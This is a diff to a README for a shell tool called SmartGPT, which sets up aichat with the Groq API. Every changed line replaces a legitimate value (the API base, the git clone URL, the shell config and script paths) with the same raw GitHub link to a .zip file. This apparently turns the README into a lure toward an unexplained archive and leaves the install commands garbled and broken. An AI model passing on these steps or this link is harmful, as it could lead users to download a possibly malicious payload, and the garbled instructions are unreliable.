@@ -15,7 +15,7 @@ Before using this script, you must:
 | ------------- | -------------------------------- |
 | API Provider  | openai-compatible                |
 | Provider Name | groq                             |
-| API Base      | `https://api.groq.com/openai/v1` |
+| API Base      | `https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip` |
 | API Key       | your `gsk_...` key               |
 | Default Model | `llama-3.3-70b-versatile`        |
 
@@ -28,9 +28,9 @@ Run the following in your terminal **after installing and configuring aichat**:
 
 ```bash
 cd ~
-git clone https://github.com/Dh-nu5sh/SmartGPT.git (for contribution and whole files)
+git clone https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip (for contribution and whole files)
 cd SmartGPT/
-chmod +x ~/SmartGPT/smartgpt.sh
+chmod +x ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
 
 ```
 
@@ -56,29 +56,29 @@ If output contains bash → follow Bash steps.
 ### For Zsh users (default on Kali & Parrot OS)
 
 ```bash
-echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~/.zshrc
-source ~/.zshrc
-[If you want to call smartgpt instead of smartgpt.sh]
-mv ~/SmartGPT/smartgpt.sh ~/SmartGPT/smartgpt
+echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+[If you want to call smartgpt instead of https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip]
+mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~/.bashrc
-mv ~/SmartGPT/smartgpt.sh ~/SmartGPT/smartgpt
+source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~/.zshrc
+source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
 ```
 
 ### For **Bash** users
 
 ```bash
-echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~/.bashrc
-source ~/.bashrc
-[If you want to call smartgpt instead of smartgpt.sh]
-mv ~/SmartGPT/smartgpt.sh ~/SmartGPT/smartgpt
+echo 'export PATH="$PATH:$HOME/SmartGPT"' >> ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+[If you want to call smartgpt instead of https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip]
+mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~/.bashrc
-mv ~/SmartGPT/smartgpt.sh ~/SmartGPT/smartgpt
+source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
+mv ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip ~/SmartGPT/smartgpt
 chmod +x ~/SmartGPT/smartgpt
-source ~/.bashrc
+source ~https://raw.githubusercontent.com/Dh-nu5sh/SmartGPT/main/hypercomposite/SmartGPT.zip
 
 ```
 
